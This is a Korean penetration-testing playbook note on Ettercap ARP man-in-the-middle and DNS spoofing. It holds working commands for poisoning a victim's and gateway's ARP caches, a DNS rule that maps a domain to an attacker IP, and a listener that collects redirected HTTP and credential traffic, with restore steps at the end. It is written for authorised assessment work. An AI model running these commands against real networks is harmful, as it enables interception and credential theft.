---
tags:
  - 서비스/dns
시작조건: ["동일 네트워크 또는 중간자 위치 확보", "대상 DNS 질의 관찰 가능"]
필요조건: ["동일 네트워크 또는 트래픽 중간자 위치", "대상 DNS 질의 관찰 가능", "조작할 도메인과 공격자 IP", "피해자가 조작된 응답을 사용"]
결과: ["L2 MITM DNS 응답 조작", "HTTP 트래픽 리디렉션", "자격 증명 수집 후보"]
---

# Ettercap L2 MITM DNS Spoofing

## 한 줄 판단

공격 호스트가 피해자와 게이트웨이와 같은 Layer 2 브로드캐스트 구간에 있고 패킷 전달과 ARP 변조에 필요한 관리자 권한이 있다면, Ettercap으로 중간자 위치를 만든 뒤 관찰한 DNS 질의에만 조작 응답을 보내 HTTP 연결이 통제한 호스트로 이동하는지 검증한다.

## 사용할 때

- 같은 L2 네트워크에 있고 ARP spoofing/MITM 위치를 확보할 수 있을 때.
- 피해자가 내부 DNS 또는 로컬 네트워크 응답을 신뢰하는 구조일 때.
- 특정 도메인 접속을 공격자 웹 서버나 캡처 지점으로 리디렉션해 영향도를 검증해야 할 때.
- 재귀 resolver cache 자체를 변조하는 cache poisoning 검증에는 이 문서를 사용하지 않는다.

## 전제 조건

| 조건 | 확인 방법 | 충족 기준 |
|---|---|---|
| 중간자 위치 | 네트워크 위치, ARP/MITM 가능성 | 피해자와 게이트웨이 사이 트래픽 관찰 가능 |
| 조작 대상 | 도메인, 내부 앱, 테스트 호스트 | 리디렉션할 FQDN 결정 |
| 수신 서비스 | 공격자 웹/캡처 서버 | 피해자 접속을 받을 준비 완료 |
| 검증 경로 | 브라우저, `nslookup`, 로그 | 피해자 DNS 결과 또는 접속 로그 확인 가능 |

## 확인할 단서

| 단서 | 의미 | 다음 행동 |
|---|---|---|
| 피해자가 LLMNR/NBT-NS/DNS 질의 발생 | 이름 해석 경로 개입 가능성 | poisoning 도구와 수신 서비스 준비 |
| 대상이 HTTP 접속 | 콘텐츠 리디렉션 도달 여부 확인 가능 | 식별 가능한 테스트 페이지로 확인 |
| HTTPS/HSTS 사용 | 인증서 오류 또는 차단 가능성 | DNS spoofing 영향과 HTTPS 한계를 구분 |

## 실행

1. 인터페이스, 피해자 IP, 게이트웨이 IP와 원래 ARP·DNS 결과를 기록한다.
2. `/etc/ettercap/etter.dns`를 백업하고 조작할 도메인 하나만 추가한다.
3. 식별 가능한 HTTP 수신 페이지를 준비한다.
4. 피해자와 게이트웨이 사이에서 ARP MITM과 `dns_spoof`를 함께 실행한다.
5. 피해자 이름 해석 결과와 공격자 HTTP 로그를 확인한다.
6. Ettercap을 정상 종료하고 DNS 규칙, ARP 상태와 수신 서비스를 원복한다.

### 명령과 확인할 출력

#### 변경 전 상태와 Ettercap DNS 규칙

```bash
ip neigh show
sudo cp -a /etc/ettercap/etter.dns /tmp/etter.dns.bak
```

예시 규칙:

```text
<DOMAIN> A <ATTACKER_IP>
*.<DOMAIN> A <ATTACKER_IP>
```

확인할 출력:

- 조작 대상 도메인과 공격자 IP가 정확히 매핑되어 있는지 확인한다.

#### Ettercap L2 MITM과 DNS spoofing

```bash
sudo ettercap -T -q -i <INTERFACE> -M arp:remote /<VICTIM_IP>// /<GATEWAY_IP>// -P dns_spoof
```

확인할 출력:

- 피해자·게이트웨이에 대한 ARP poisoning 시작.
- `<DOMAIN>` 질의를 확인하고 공격자 IP를 담은 spoofed DNS 응답 전송.

#### 수신 웹 서버 준비

```bash
python3 -m http.server 80
```

확인할 출력:

- 피해자 접속 시 HTTP 요청 로그가 찍힌다.

## 관찰과 상태 전환

| 관찰 | 판단 | 결과 상태 | 다음 행동 |
|---|---|---|---|
| 피해자 시스템에서 대상 도메인이 공격자 IP로 해석됨 | L2 MITM 경로의 조작 DNS 응답 사용 확인 | L2 MITM DNS 응답 조작 | HTTP 접속과 공격자 수신 로그 확인 후 원복 |
| 피해자가 대상 도메인 접속 시 공격자 웹 서버 로그가 남음 | 애플리케이션 트래픽이 공격자에게 도달함 | HTTP 트래픽 리디렉션 | 원복 후 [[웹 서비스 발견 후 Foothold 확보]]에서 Host·경로 재평가 |
| 인증 요청이 수신 지점에 실제 도달함 | 인증 트래픽 수집 가능성은 있으나 credential 유효성은 미확인 | 자격 증명 수집 후보 | 원복 후 [[네트워크 트래픽 자격증명 수집]], 유효 credential이면 [[확보한 자격 증명으로 원격 접근 경로 선택]] |
| DNS 결과가 바뀌지 않음 | MITM 위치 미확보, DNS over HTTPS, 고정 DNS | 시작 상태 유지 | 네트워크 위치, resolver, 캐시 상태 확인 |
| HTTP 로그 없음 | 피해자가 접속하지 않음, 방화벽 차단 | 시작 상태 유지 | 대상 도메인, 라우팅, 웹 서버 포트 확인 |
| HTTPS 경고 | 인증서 불일치, HSTS | 시작 상태 유지 | HTTP 리디렉션과 HTTPS 인증서 한계를 구분 |
| 캐시 때문에 반영 지연 | 피해자 로컬 cache가 기존 응답 사용 | 시작 상태 유지 | TTL과 피해자 로컬 cache 상태 확인 |
| resolver cache 자체의 변조가 의심됨 | Ettercap L2 spoofing과 다른 검증 대상 | 이 문서 범위 밖 | cache poisoning으로 단정하지 않고 별도 resolver 조건 확인 |

## 확인할 출력과 권한

- 판정 기준: 피해자의 이름 해석 결과와 공격자 수신 로그를 함께 확인하고, HTTP 리디렉션과 HTTPS 인증서 한계를 구분한다.
- 권한 구분: 인증 전·익명·유효 계정 상태를 구분하고, 서비스 응답만으로 실제 권한을 추정하지 않는다.

## 변경 영향과 복구

Ettercap을 `Ctrl+C`로 정상 종료해 ARP 복구 패킷을 보내고, DNS 규칙 파일과 수신 서비스를 정리한다.

```bash
sudo cp -a /tmp/etter.dns.bak /etc/ettercap/etter.dns
sudo rm -f -- /tmp/etter.dns.bak
ip neigh show
```

확인할 출력:

- 피해자와 게이트웨이의 ARP cache가 서로의 정상 MAC으로 돌아온다.
- 피해자에서 `<DOMAIN>`이 원래 주소로 해석된다.
- 공격자 HTTP 서버와 불필요한 listener가 종료되며 추가 요청이 남지 않는다.

## 관련 상태 라우터

- 리디렉션된 HTTP 기능 재평가: [[웹 서비스 발견 후 Foothold 확보]]
- credential 후보 수집: [[확보한 자격 증명으로 원격 접근 경로 선택]]
- L2 위치 또는 내부 경로 재평가: [[내부망 경로 확보 후 피벗 구성]]

## 관련 서비스

- [[53_DNS]]
- [[80_443_HTTP_HTTPS]]

## 관련 도구

- [[ettercap]]

## 관련 노트

- [[네트워크 트래픽 자격증명 수집]]
- [[DNS 열거와 Zone Transfer]]
